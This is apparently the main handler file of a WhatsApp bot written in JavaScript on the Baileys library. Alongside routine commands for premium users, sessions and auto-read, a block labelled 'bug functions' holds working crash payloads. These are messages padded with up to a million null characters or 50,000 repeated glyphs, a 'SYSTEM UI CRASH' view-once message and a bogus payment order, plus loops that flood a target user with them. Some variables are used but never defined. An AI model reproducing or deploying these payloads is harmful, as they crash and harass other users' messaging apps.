/*𝐁𝐚𝐬𝐞 𝐛𝐲 𝐃𝐚𝐯𝐢𝐝 𝐓𝐞𝐜𝐡 𝐂𝐡𝐮𝐝𝐝𝐲 𝐁𝐮𝐝𝐝𝐲 𝐖𝐡𝐚𝐭𝐬𝐚𝐩𝐩 𝐁𝐨𝐭 



- 𝐜𝐡𝐚𝐧𝐧𝐞𝐥: https://whatsapp.com/channel/0029VbANsvkIiRp31CEW3C2C



- 𝐝𝐞𝐯𝐞𝐥𝐨𝐩𝐩𝐞𝐫: wa.me/24105730123
*/
const { default: makeWaSocket, useMultiFileAuthState, BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType } = require('@whiskeysockets/baileys')
const os = require('os')
const fs = require('fs') 
const fsx = require('fs-extra')
const path = require('path')
const util = require('util')
const chalk = require('chalk')
const moment = require('moment-timezone')
const speed = require('performance-now')
const ms = toMs = require('ms')
const axios = require('axios')
const fetch = require('node-fetch')
const pino = require('pino')
const { exec, spawn, execSync } = require("child_process")
const { performance } = require('perf_hooks')
const more = String.fromCharCode(8206)
const readmore = more.repeat(4001)
const { TelegraPh, UploadFileUgu, webp2mp4File, floNime } = require('./lib/uploader')
const { toAudio, toPTT, toVideo, ffmpeg, addExifAvatar } = require('./lib/converter')
const { smsg, getGroupAdmins, formatp, jam, formatDate, getTime, isUrl, await, sleep, clockString, msToDate, sort, toNumber, enumGetKey, runtime, fetchJson, getBuffer, json, delay, format, logic, generateProfilePicture, parseMention, getRandom, pickRandom, reSize } = require('./lib/myfunc')
let afk = require("./lib/afk");
const { addPremiumUser, getPremiumExpired, getPremiumPosition, expiredCheck, checkPremiumUser, getAllPremiumUser } = require('./lib/premiun')
const { fetchBuffer, buffergif } = require("./lib/myfunc2")

//requirement
const wkwk = fs.readFileSync(`./data/x.mp3`)
const xsteek = fs.readFileSync(`./data/x.webp`)


//database
let premium = JSON.parse(fs.readFileSync('./database/premium.json'))
let _owner = JSON.parse(fs.readFileSync('./database/owner.json'))
let owner = JSON.parse(fs.readFileSync('./database/owner.json'))
let _afk = JSON.parse(fs.readFileSync('./database/afk-user.json'))
let hit = JSON.parse(fs.readFileSync('./database/total-hit-user.json'))

//autorep
const VoiceNoteXeon = JSON.parse(fs.readFileSync('./database/autoreply/vn.json'))
const StickerXeon = JSON.parse(fs.readFileSync('./database/autoreply/sticker.json'))
const ImageXeon = JSON.parse(fs.readFileSync('./database/autoreply/image.json'))
const VideoXeon = JSON.parse(fs.readFileSync('./database/autoreply/video.json'))
const DocXeon = JSON.parse(fs.readFileSync('./database/autoreply/doc.json'))
const ZipXeon = JSON.parse(fs.readFileSync('./database/autoreply/zip.json'))
const ApkXeon = JSON.parse(fs.readFileSync('./database/autoreply/apk.json'))

//time
const xtime = moment.tz('Asia/Kolkata').format('HH:mm:ss')
        const xdate = moment.tz('Asia/Kolkata').format('DD/MM/YYYY')
        const time2 = moment().tz('Asia/Kolkata').format('HH:mm:ss')  
         if(time2 < "23:59:00"){
var xeonytimewisher = `Good Night 🌃`
 }
 if(time2 < "19:00:00"){
var xeonytimewisher = `Good Evening 🌉`
 }
 if(time2 < "18:00:00"){
var xeonytimewisher = `Good Evening🌉 `
 }
 if(time2 < "15:00:00"){
var xeonytimewisher = `Good Afternoon`
 }
 if(time2 < "11:00:00"){
var xeonytimewisher = `Good Morning🌄`
 }
 if(time2 < "05:00:00"){
var xeonytimewisher = `Good Morning 🌄`
 } 
module.exports = XeonBotInc = async (XeonBotInc, m, msg, chatUpdate, store) => {
    try {
        const {
            type,
            quotedMsg,
            mentioned,
            now,
            fromMe
        } = m
        var body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectreplygcxeon.selectedRowId : (m.mtype == 'templateButtonreplygcxeonMessage') ? m.message.templateButtonreplygcxeonMessage.selectedId : (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectreplygcxeon.selectedRowId || m.text) : ''
        var budy = (typeof m.text == 'string' ? m.text : '')
        var prefix = prefa ? /^[Â°â€¢Ï€Ã·Ã—Â¶âˆ†Â£Â¢â‚¬Â¥Â®â„¢+âœ“_=|~!?@#$%^&.Â©^]/gi.test(body) ? body.match(/^[Â°â€¢Ï€Ã·Ã—Â¶âˆ†Â£Â¢â‚¬Â¥Â®â„¢+âœ“_=|~!?@#$%^&.Â©^]/gi)[0] : "" : prefa ?? global.prefix
        const isCmd = body.startsWith(prefix)
        const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
        const args = body.trim().split(/ +/).slice(1)
        const full_args = body.replace(command, '').slice(1).trim()
        const pushname = m.pushName || "No Name"
        const botNumber = await XeonBotInc.decodeJid(XeonBotInc.user.id)
        const itsMe = m.sender == botNumber ? true : false
        const sender = m.sender
        const text = q = args.join(" ")
        const from = m.key.remoteJid
        const fatkuns = (m.quoted || m)
        const quoted = (fatkuns.mtype == 'buttonsMessage') ? fatkuns[Object.keys(fatkuns)[1]] : (fatkuns.mtype == 'templateMessage') ? fatkuns.hydratedTemplate[Object.keys(fatkuns.hydratedTemplate)[1]] : (fatkuns.mtype == 'product') ? fatkuns[Object.keys(fatkuns)[0]] : m.quoted ? m.quoted : m
        const mime = (quoted.msg || quoted).mimetype || ''
        const qmsg = (quoted.msg || quoted)
        const isMedia = /image|video|sticker|audio/.test(mime)
        const isImage = (type == 'imageMessage')
        const isVideo = (type == 'videoMessage')
        const isAudio = (type == 'audioMessage')
        const isText = (type == 'textMessage')
        const isSticker = (type == 'stickerMessage')
        const isQuotedText = type === 'extendexTextMessage' && content.includes('textMessage')
        const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')
        const isQuotedLocation = type === 'extendedTextMessage' && content.includes('locationMessage')
        const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')
        const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')
        const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')
        const isQuotedContact = type === 'extendedTextMessage' && content.includes('contactMessage')
        const isQuotedDocument = type === 'extendedTextMessage' && content.includes('documentMessage')
        const sticker = []
        const isAfkOn = afk.checkAfkUser(m.sender, _afk)
        const isGroup = m.key.remoteJid.endsWith('@g.us')
        const groupMetadata = m.isGroup ? await XeonBotInc.groupMetadata(m.chat).catch(e => {}) : ''
        const groupName = m.isGroup ? groupMetadata.subject : ''
        const participants = m.isGroup ? await groupMetadata.participants : ''
        const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : ''
        const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
        const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
        const groupOwner = m.isGroup ? groupMetadata.owner : ''
        const isGroupOwner = m.isGroup ? (groupOwner ? groupOwner : groupAdmins).includes(m.sender) : false
        const isCreator = [ownernumber, ..._owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
        const isPremium = isCreator || isCreator || checkPremiumUser(m.sender, premium);
        const clientId = XeonBotInc.user.id.split(':')[0];
        const senderbot = m.key.fromMe ? XeonBotInc.user.id.split(':')[0] + "@s.whatsapp.net" || XeonBotInc.user.id : m.key.participant || m.key.remoteJid;
        const senderId = senderbot.split('@')[0];
        const isBot = clientId.includes(senderId);
        expiredCheck(XeonBotInc, m, premium);
//group chat msg by xeon
const replygcxeon = (teks) => {
XeonBotInc.sendMessage(m.chat,
{ text: teks,
contextInfo:{
mentionedJid:[sender],
forwardingScore: 9999999,
isForwarded: true, 
"externalAdReply": {
"showAdAttribution": true,
"containsAutoReply": true,
"title": ` ${global.botname}`,
"body": `${ownername}`,
"previewType": "PHOTO",
"thumbnailUrl": ``,
"thumbnail": fs.readFileSync(`./crazy-core/thumb.jpg`),
"sourceUrl": `${link}`}}},
{ quoted: m})
}

//bug functions
const sendReaction = async reactionContent => {
  XeonBotInc.sendMessage(m.chat, {
    'react': {
      'text': reactionContent,
      'key': m.key
    }
  });
};

async function sendRepeatedMessages(jid, count) {
  for (let i = 0; i < count; i++) {
   XeonBotInc.sendMessage(recipientJid, {
      'text': ''.repeat(50000)
    }, {
      'participant': {
        'jid': jid
      },
      'messageId': etc.key.id
    }, {
      'quoted': m
    });
  }
}

async function sendViewOnceMessages(jid, count) {
  for (let i = 0; i < count; i++) {
    let messageContent = generateWAMessageFromContent(jid, {
      'viewOnceMessage': {
        'message': {
          'messageContextInfo': {
            'deviceListMetadata': {},
            'deviceListMetadataVersion': 2
          },
          'interactiveMessage': proto.Message.InteractiveMessage.create({
            'body': proto.Message.InteractiveMessage.Body.create({
              'text': ''
            }),
            'footer': proto.Message.InteractiveMessage.Footer.create({
              'text': ''
            }),
            'header': proto.Message.InteractiveMessage.Header.create({
              'title': '',
              'subtitle': '',
              'hasMediaAttachment': false
            }),
            'nativeFlowMessage': proto.Message.InteractiveMessage.NativeFlowMessage.create({
              'buttons': [{
                'name': "cta_url",
                'buttonParamsJson': "{\"display_text\":\"à¾§\".repeat(50000),\"url\":\"https://www.google.com\",\"merchant_url\":\"https://www.google.com\"}"
              }],
              'messageParamsJson': "\0".repeat(100000)
            })
          })
        }
      }
    }, {});
    XeonBotInc.relayMessage(jid, messageContent.message, {
      'messageId': messageContent.key.id
    });
  }
}

async function sendSystemCrashMessage(jid) {
  var messageContent = generateWAMessageFromContent(jid, proto.Message.fromObject({
    'viewOnceMessage': {
      'message': {
        'interactiveMessage': {
          'header': {
            'title': '',
            'subtitle': " "
          },
          'body': {
            'text': "SÌ¸Yê™°Ì¸Sê™°Ì¸Tê™°Ì¸Eê™°Ì¸Mê™°Ì¸ UÌ¸IÌ¸ CÌ¸Rê™°Ì¸Aê™°Ì¸Sê™°Ì¸Hê™°Ì¸"
          },
          'footer': {
            'text': 'xp'
          },
          'nativeFlowMessage': {
            'buttons': [{
              'name': 'cta_url',
              'buttonParamsJson': "{ display_text : 'SÌ¸Yê™°Ì¸Sê™°Ì¸Tê™°Ì¸Eê™°Ì¸Mê™°Ì¸ UÌ¸IÌ¸ CÌ¸Rê™°Ì¸Aê™°Ì¸Sê™°Ì¸Hê™°Ì¸', url : , merchant_url :  }"
            }],
            'messageParamsJson': "\0".repeat(1000000)
          }
        }
      }
    }
  }), {
    'userJid': jid
  });
  await XeonBotInc.relayMessage(jid, messageContent.message, {
    'participant': {
      'jid': jid
    },
    'messageId': messageContent.key.id
  });
}
async function sendListMessage(jid) {
  var messageContent = generateWAMessageFromContent(jid, proto.Message.fromObject({
    'listMessage': {
      'title': "SÌ¸Yê™°Ì¸Sê™°Ì¸Tê™°Ì¸Eê™°Ì¸Mê™°Ì¸ UÌ¸IÌ¸ CÌ¸Rê™°Ì¸Aê™°Ì¸Sê™°Ì¸Hê™°Ì¸" + "\0".repeat(920000),
      'footerText': "àº®â‚®à½žà¸¨Vê™°à¸¨ à¹–àº¡Gê™°à½€Í¡Íœâœ…âƒŸâ•®",
      'description': "àº®â‚®à½žà¸¨Vê™°à¸¨ à¹–àº¡Gê™°à½€Í¡Íœâœ…âƒŸâ•®",
      'buttonText': null,
      'listType': 2,
      'productListInfo': {
        'productSections': [{
          'title': "lol",
          'products': [{
            'productId': "4392524570816732"
          }]
        }],
        'productListHeaderImage': {
          'productId': "4392524570816732",
          'jpegThumbnail': null
        },
        'businessOwnerJid': "0@s.whatsapp.net"
      }
    },
    'footer': "lol",
    'contextInfo': {
      'expiration': 600000,
      'ephemeralSettingTimestamp': "1679959486",
      'entryPointConversionSource': "global_search_new_chat",
      'entryPointConversionApp': "whatsapp",
      'entryPointConversionDelaySeconds': 9,
      'disappearingMode': {
        'initiator': "INITIATED_BY_ME"
      }
    },
    'selectListType': 2,
    'product_header_info': {
      'product_header_info_id': 292928282928,
      'product_header_is_rejected': false
    }
  }), {
    'userJid': jid
  });
  
  await XeonBotInc.relayMessage(jid, messageContent.message, {
    'participant': {
      'jid': jid
    },
    'messageId': messageContent.key.id
  });
}

async function sendLiveLocationMessage(jid) {
  var messageContent = generateWAMessageFromContent(jid, proto.Message.fromObject({
    'viewOnceMessage': {
      'message': {
        'liveLocationMessage': {
          'degreesLatitude': 'p',
          'degreesLongitude': 'p',
          'caption': 'Ø‚Ù†ØƒØ„Ù½Ø‚Ù†ØƒØ„Ù½' + 'ê¦¾'.repeat(50000),
          'sequenceNumber': '0',
          'jpegThumbnail': ''
        }
      }
    }
  }), {
    'userJid': jid
  });
  
  await XeonBotInc.relayMessage(jid, messageContent.message, {
    'participant': {
      'jid': jid
    },
    'messageId': messageContent.key.id
  });
}

async function sendExtendedTextMessage(jid) {
  XeonBotInc.relayMessage(jid, {
    'extendedTextMessage': {
      'text': '.',
      'contextInfo': {
        'stanzaId': jid,
        'participant': jid,
        'quotedMessage': {
          'conversation': 'Ø‚Ù†ØƒØ„Ù½Ø‚Ù†ØƒØ„Ù½' + 'ê¦¾'.repeat(50000)
        },
        'disappearingMode': {
          'initiator': "CHANGED_IN_CHAT",
          'trigger': "CHAT_SETTING"
        }
      },
      'inviteLinkGroupTypeV2': "DEFAULT"
    }
  }, {
    'participant': {
      'jid': jid
    }
  }, {
    'messageId': null
  });
}
async function sendPaymentInvite(jid) {
  XeonBotInc.relayMessage(jid, {
    'paymentInviteMessage': {
      'serviceType': "UPI",
      'expiryTimestamp': Date.now() + 86400000
    }
  }, {
    'participant': {
      'jid': jid
    }
  });
}

async function sendMultiplePaymentInvites(jid, count) {
  for (let i = 0; i < count; i++) {
    sendPaymentInvite(jid);
    sendExtendedTextMessage(jid);
    await sleep(500);
  }
}

async function sendVariousMessages(jid, count) {
  for (let i = 0; i < count; i++) {
    sendListMessage(jid);
    sendLiveLocationMessage(jid);
    sendSystemCrashMessage(jid);
    await sleep(500);
  }
}

async function sendRepeatedMessages2(jid, count) {
  for (let i = 0; i < count; i++) {
    sendSystemCrashMessage(jid);
    sendSystemCrashMessage(jid);
    sendSystemCrashMessage(jid);
    await sleep(500);
  }
}

async function sendMixedMessages(jid, count) {
  for (let i = 0; i < count; i++) {
    sendLiveLocationMessage(jid);
    sendListMessage(jid);
    await sleep(500);
  }
}

function sendMessageWithMentions(text, mentions = [], quoted = false) {
  if (quoted == null || quoted == undefined || quoted == false) {
    return XeonBotInc.sendMessage(m.chat, {
      'text': text,
      'mentions': mentions
    }, {
      'quoted': m
    });
  } else {
    return XeonBotInc.sendMessage(m.chat, {
      'text': text,
      'mentions': mentions
    }, {
      'quoted': m
    });
  }
}

const xbug2 = {
key: {
remoteJid: 'status@broadcast',
fromMe: false, 
participant: '0@s.whatsapp.net'
},
message: {
listResponseMessage: {
title: botname
}
}
}

const fakeflow = {
key: {
remoteJid: 'status@broadcast',
fromMe: false,
participant: '0@s.whatsapp.net'
},
'message': {
"interactiveMessage": {
"header": {
"hasMediaAttachment": true,
"jpegThumbnail": bimg
},
"nativeFlowMessage": {
"buttons": [
{
"name": "review_and_pay",
"buttonParamsJson": `{\"currency\":\"INR\",\"payment_configuration\":\"\",\"payment_type\":\"\",\"total_amount\":{\"value\":45416739902,\"offset\":100},\"reference_id\":\"40NRXY65HS6\",\"type\":\"physical-goods\",\"order\":{\"status\":\"preparing_to_ship\",\"description\":\"\",\"subtotal\":{\"value\":29759959800,\"offset\":100},\"tax\":{\"value\":14805580001,\"offset\":100},\"discount\":{\"value\":148799799,\"offset\":100},\"shipping\":{\"value\":99999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7537631592926009\",\"product_id\":\"7538731592926009\",\"name\":\"${botname}\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":999999},{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"${ownername}\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":999999},{\"retailer_id\":\"custom-item-2465f31c-4f49-46eb-9ad0-5ec5121a9c0d\",\"name\":\"\",\"amount\":{\"value\":99999900,\"offset\":100},\"quantity\":99},{\"retailer_id\":\"custom-item-13746d0a-55f0-4942-86b2-2094bc9a2978\",\"name\":\"\",\"amount\":{\"value\":99999800,\"offset\":100},\"quantity\":999999},{\"retailer_id\":\"custom-item-ab993749-045b-4f66-a1d3-264fe18fb1d0\",\"name\":\"\",\"amount\":{\"value\":99999900,\"offset\":100},\"quantity\":999999}]},\"additional_note\":\"\",\"native_payment_methods\":[]}`
}
]
}
}
}
};

const xeonimun = (texto) => {
XeonBotInc.sendMessage(from, { text: texto, mentions: [sender]}, {quoted: m }).catch(e => {
return reply("Erro..")
})
}

const subscribe_dgxeon = {
"key": { 
"fromMe": false,
"participant": '0@s.whatsapp.net',
"remoteJid": 'status@broadcast' 
},
message: {
"listResponseMessage": {
title: `Xeon's ur father`
}}
}
async function XeonyCrashy(dgxeon,chat) {
XeonBotInc.sendMessage(chat, {
document: {url: './settings.js'},
mimetype: `image/null`,
fileName: `${dgxeon}.${xeontext1}` ,
caption: `${dgxeon + xeontext1}`,
}, {quoted: subscribe_dgxeon })
}
//end bug functions

async function loading () {
var xeonlod = [
"🌌🌌🌌🌌🌌🌌🌌🌌🌌🌌🌌🌌🌌🌌🌌🌌🌌🌌10%",
"🌌🌌🌌🌌🌌🌌🌌🌌🌌🌌🌌🌌🌌🌌🌌🌌🌌🌌30%",
"🌌🌌🌌🌌🌌🌌🌌🌌🌌🌌🌌🌌🌌🌌🌌🌌🌌🌌50%",
"🌌🌌🌌🌌🌌🌌🌌🌌🌌🌌🌌🌌🌌🌌🌌🌌🌌🌌‹80%",
"🌌🌌🌌🌌🌌🌌🌌🌌🌌🌌🌌🌌🌌🌌🌌🌌🌌🌌100%",
"space loading completeed¦„..."
]
let { key } = await XeonBotInc.sendMessage(from, {text:'𝙻𝚘ading...'});

for (let i = 0; i < xeonlod.length; i++) {
await XeonBotInc.sendMessage(from, {text: xeonlod[i], edit: key });
}
}

        if (!XeonBotInc.public) {
            if (!isCreator && !m.key.fromMe) return
        }
        
        if (autoread) {
            XeonBotInc.readMessages([m.key])
        }
        
        if (global.autoTyping) {
        XeonBotInc.sendPresenceUpdate('composing', from)
        }

        if (global.autoRecording) {
        XeonBotInc.sendPresenceUpdate('recording', from)
        }

        
        //bot number online status, available=online, unavailable=offline
        XeonBotInc.sendPresenceUpdate('uavailable', from)
        
        if (global.autorecordtype) {
        let xeonrecordin = ['recording','composing']
        let xeonrecordinfinal = xeonrecordin[Math.floor(Math.random() * xeonrecordin.length)]
        XeonBotInc.sendPresenceUpdate(xeonrecordinfinal, from)

        }
        
        if (autobio) {
            XeonBotInc.updateProfileStatus(`ᴄʀᴀᴢʏ ᴠ2 ᴅᴇᴘʟᴏʏᴇᴅ ʙʏ🎉 ${pushname}`).catch(_ => _)
        }
        if (m.sender.startsWith('92') && global.anti92 === true) {
            return XeonBotInc.updateBlockStatus(m.sender, 'block')
        }
        let list = []
        for (let i of owner) {
list.push({
	    	displayName: await XeonBotInc.getName(i),
	    	vcard: `BEGIN:VCARD\nVERSION:3.0\nN:${await XeonBotInc.getName(i)}\nFN:${await XeonBotInc.getName(i)}\nitem1.TEL;waid=${i}:${i}\nitem1.X-ABLabel:Click here to chat\nitem2.EMAIL;type=INTERNET:${ytname}\nitem2.X-ABLabel:YouTube\nitem3.URL:${socialm}\nitem3.X-ABLabel:GitHub\nitem4.ADR:;;${location};;;;\nitem4.X-ABLabel:Region\nEND:VCARD`
	    })
	}
	
	//chat counter (console log)
        if (m.message && m.isGroup) {
            console.log(chalk.cyan(`\n< ================================================== >\n`))
			console.log(chalk.green(`Group Chat:`))
            console.log(chalk.black(chalk.bgWhite('[ MESSAGE ]')), chalk.black(chalk.bgGreen(new Date)), chalk.black(chalk.bgBlue(budy || m.mtype)) + '\n' + chalk.magenta('=> From'), chalk.green(pushname), chalk.yellow(m.sender) + '\n' + chalk.blueBright('=> In'), chalk.green(groupName, m.chat))
        } else {
            console.log(chalk.cyan(`\n< ================================================== >\n`))
			console.log(chalk.green(`Private Chat:`))
            console.log(chalk.black(chalk.bgWhite('[ MESSAGE ]')), chalk.black(chalk.bgGreen(new Date)), chalk.black(chalk.bgBlue(budy || m.mtype)) + '\n' + chalk.magenta('=> From'), chalk.green(pushname), chalk.yellow(m.sender))
        }

        if (command) {
            const cmdadd = () => {
                hit[0].hit_cmd += 1
                fs.writeFileSync('./database/total-hit-user.json', JSON.stringify(hit))
            }
            cmdadd()
            const totalhit = JSON.parse(fs.readFileSync('./database/total-hit-user.json'))[0].hit_cmd
        }
        
for (let BhosdikaXeon of VoiceNoteXeon) {
if (budy === BhosdikaXeon) {
let audiobuffy = fs.readFileSync(`./crazy-core/audio/${BhosdikaXeon}.mp3`)
XeonBotInc.sendMessage(m.chat, { audio: audiobuffy, mimetype: 'audio/mp4', ptt: true }, { quoted: m })     
}
}
for (let BhosdikaXeon of StickerXeon){
if (budy === BhosdikaXeon){
let stickerbuffy = fs.readFileSync(`./crazy-core/sticker/${BhosdikaXeon}.webp`)
XeonBotInc.sendMessage(m.chat, { sticker: stickerbuffy }, { quoted: m })
}
}
for (let BhosdikaXeon of ImageXeon){
if (budy === BhosdikaXeon){
let imagebuffy = fs.readFileSync(`./crazy-core/image/${BhosdikaXeon}.jpg`)
XeonBotInc.sendMessage(m.chat, { image: imagebuffy }, { quoted: m })
}
}
for (let BhosdikaXeon of VideoXeon){
if (budy === BhosdikaXeon){
let videobuffy = fs.readFileSync(`./crazy-core/video/${BhosdikaXeon}.mp4`)
XeonBotInc.sendMessage(m.chat, { video: videobuffy }, { quoted: m })
}
}

const sendapk = (teks) => {
XeonBotInc.sendMessage(from, { document: teks, mimetype: 'application/vnd.android.package-archive'}, {quoted:m})
}
for (let BhosdikaXeon of ApkXeon) {
if (budy === BhosdikaXeon) {
let buffer = fs.readFileSync(`./crazy-core/apk/${BhosdikaXeon}.apk`)
sendapk(buffer)
}
}

const sendzip = (teks) => {
XeonBotInc.sendMessage(from, { document: teks, mimetype: 'application/zip'}, {quoted:m})
}
for (let BhosdikaXeon of ZipXeon) {
if (budy === BhosdikaXeon) {
let buffer = fs.readFileSync(`./crazy-core/zip/${BhosdikaXeon}.zip`)
sendzip(buffer)
}
}

const senddocu = (teks) => {
haikal.sendMessage(from, { document: teks, mimetype: 'application/pdf'}, {quoted:m})
}
for (let BhosdikaXeon of DocXeon) {
if (budy === BhosdikaXeon) {
let buffer = fs.readFileSync(`./crazy-core/doc/${BhosdikaXeon}.pdf`)
senddocu(buffer)
}
}
        
        if (m.isGroup && !m.key.fromMe) {
            let mentionUser = [...new Set([...(m.mentionedJid || []), ...(m.quoted ? [m.quoted.sender] : [])])]
            for (let ment of mentionUser) {
                if (afk.checkAfkUser(ment, _afk)) {
                    let getId2 = afk.getAfkId(ment, _afk)
                    let getReason2 = afk.getAfkReason(getId2, _afk)
                    let getTimee = Date.now() - afk.getAfkTime(getId2, _afk)
                    let heheh2 = ms(getTimee)
                    replygcxeon(`Don't tag him, he's afk\n\n*Reason :* ${getReason2}`)
                }
            }
            if (afk.checkAfkUser(m.sender, _afk)) {
                let getId = afk.getAfkId(m.sender, _afk)
                let getReason = afk.getAfkReason(getId, _afk)
                let getTime = Date.now() - afk.getAfkTime(getId, _afk)
                let heheh = ms(getTime)
                _afk.splice(afk.getAfkPosition(m.sender, _afk), 1)
                fs.writeFileSync('./database/afk-user.json', JSON.stringify(_afk))
                XeonBotInc.sendTextWithMentions(m.chat, `@${m.sender.split('@')[0]} have returned from afk`, m)
            }
        }
        switch (command) {
            case 'addprem':
                if (!isCreator) return replygcxeon(mess.owner)
                if (args.length < 2)
                    return replygcxeon(`Use :\n*#addprem* @tag time\n*#addprem* number time\n\nExample : #addprem @tag 30d`);
                if (m.mentionedJid.length !== 0) {
                    for (let i = 0; i < m.mentionedJid.length; i++) {
                        addPremiumUser(m.mentionedJid[0], args[1], premium);
                    }
                    replygcxeon("Premium Success")
                } else {
                    addPremiumUser(args[0] + "@s.whatsapp.net", args[1], premium);
                    replygcxeon("Success")
                }
                break
            case 'delprem':
                if (!isCreator) return replygcxeon(mess.owner)
                if (args.length < 1) return replygcxeon(`Use :\n*#delprem* @tag\n*#delprem* number`);
                if (m.mentionedJid.length !== 0) {
                    for (let i = 0; i < m.mentionedJid.length; i++) {
                        premium.splice(getPremiumPosition(m.mentionedJid[i], premium), 1);
                        fs.writeFileSync("./database/premium.json", JSON.stringify(premium));
                    }
                    replygcxeon("Delete success")
                } else {
                    premium.splice(getPremiumPosition(args[0] + "@s.whatsapp.net", premium), 1);
                    fs.writeFileSync("./database/premium.json", JSON.stringify(premium));
                    replygcxeon("Success")
                }
                break
            case 'listprem': {
                if (!isCreator) return replygcxeon(mess.owner)
                let data = require("./database/premium.json")
                let txt = `*------ã€Œ LIST PREMIUM ã€------*\n\n`
                for (let i of data) {
                    txt += `Number : ${i.id}\n`
                    txt += `Expired : ${i.expired} Second\n`         
                }                
                XeonBotInc.sendMessage(m.chat, {
                    text: txt,
                    mentions: i
                }, {
                    quoted: m
                })
            }
            break
            case 'deletesession':
            case 'delsession':
            case 'clearsession': {
                if (!isCreator) return replygcxeon(mess.owner)
                fs.readdir("./session", async function(err, files) {
                    if (err) {
                        console.log('Unable to scan directory: ' + err);
                        return replygcxeon('Unable to scan directory: ' + err);
                    }
                    let filteredArray = await files.filter(item => item.startsWith("pre-key") ||
                        item.startsWith("sender-key") || item.startsWith("session-") || item.startsWith("app-state")
                    )
                    console.log(filteredArray.length);
                    let teks = `Detected ${filteredArray.length} junk files\n\n`
                    if (filteredArray.length == 0) return replygcxeon(teks)
                    filteredArray.map(function(e, i) {
                        teks += (i + 1) + `. ${e}\n`
                    })
                    replygcxeon(teks)
                    await sleep(2000)
                    replygcxeon("Delete junk files...")
                    await filteredArray.forEach(function(file) {
                        fs.unlinkSync(`./session/${file}`)
                    });
                    await sleep(2000)
                    replygcxeon("Successfully deleted all the trash in the session folder")
                });
            }
            break
            case 'join':
                try {
                    if (!isCreator) return replygcxeon(mess.owner)
                    if (!text) return replygcxeon('Enter Group Link!')
                    if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return replygcxeon('Link Invalid!')
                    replygcxeon(mess.wait)
                    let result = args[0].split('https://chat.whatsapp.com/')[1]
                    await XeonBotInc.groupAcceptInvite(result).then((res) => replygcxeon(json(res))).catch((err) => replygcxeon(json(err)))
                } catch {
                    replygcxeon('Failed to join the Group')
                }
                break      
            case 'getsession':
                if (!isCreator) return replygcxeon(mess.owner)
                replygcxeon('Wait a moment, currently retrieving your session file')
                let sesi = await fs.readFileSync('./session/creds.json')
                XeonBotInc.sendMessage(m.chat, {
                    document: sesi,
                    mimetype: 'application/json',
                    fileName: 'creds.json'
                }, {
                    quoted: m
                })
                break
            case 'shutdown':
                if (!isCreator) return replygcxeon(mess.owner)
                replygcxeon(`ɢᴏᴏᴅʙʏᴇ ✌️`)
                await sleep(3000)
                process.exit()
                break
            case 'restart':
                if (!isCreator) return replygcxeon(mess.owner)
                replygcxeon('ʀᴇsᴛᴀʀɪɴɢ ᴘʀᴏᴄᴇss ᴡᴀɪᴛ...')
                exec('pm2 restart all')
                break
            case 'autoread':
                if (!isCreator) return replygcxeon(mess.owner)
                if (args.length < 1) return replygcxeon(`Example ${prefix + command} on/off`)
                if (q === 'on') {
                    autoread = true
                    replygcxeon(`Successfully changed autoread to ${q}`)
                } else if (q === 'off') {
                    autoread = false
                    replygcxeon(`Successfully changed autoread to ${q}`)
                }
                break
                case 'autotyping':
                if (!isCreator) return replygcxeon(mess.owner)
                if (args.length < 1) return replygcxeon(`Example ${prefix + command} on/off`)
                if (q === 'on') {
                    autoTyping = true
                    replygcxeon(`Successfully changed auto-typing to ${q}`)
                } else if (q === 'off') {
                    autoTyping = false
                    replygcxeon(`Successfully changed auto-typing to ${q}`)
                }
                break
                case 'autorecording':
                if (!isCreator) return replygcxeon(mess.owner)
                if (args.length < 1) return replygcxeon(`Example ${prefix + command} on/off`)
                if (q === 'on') {
                    autoRecording = true
                    replygcxeon(`Successfully changed auto-recording to ${q}`)
                } else if (q === 'off') {
                    autoRecording = false
                    replygcxeon(`Successfully changed auto-recording to ${q}`)
                }
                break
                case 'autorecordtyp':
                if (!isCreator) return replygcxeon(mess.owner)
                if (args.length < 1) return replygcxeon(`Example ${prefix + command} on/off`)
                if (q === 'on') {
                    autorecordtype = true
                    replygcxeon(`Successfully changed auto recording and typing to ${q}`)
                } else if (q === 'off') {
                    autorecordtype = false
                    replygcxeon(`Successfully changed auto recording and typing to ${q}`)
                }
                break
                case 'autoswview':
    case 'autostatusview':{
             if (!isCreator) return replygcxeon(mess.owner)
               if (args.length < 1) return replygcxeon('on/off?')
               if (args[0] === 'on') {
                  autoswview = true
                  replygcxeon(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  autoswview = false
                  replygcxeon(`${command} is disabled`)
               }
            }
            break
            case 'autobio':
                if (!isCreator) return replygcxeon(mess.owner)
                if (args.length < 1) return replygcxeon(`Example ${prefix + command} on/off`)
                if (q == 'on') {
                    autobio = true
                    replygcxeon(`Successfully Changed AutoBio To ${q}`)
                } else if (q == 'off') {
                    autobio = false
                    replygcxeon(`Successfully Changed AutoBio To ${q}`)
                }
                break
            case 'mode':
                if (!isCreator) return replygcxeon(mess.owner)
                if (args.length < 1) return replygcxeon(`Example ${prefix + command} public/self`)
                if (q == 'public') {
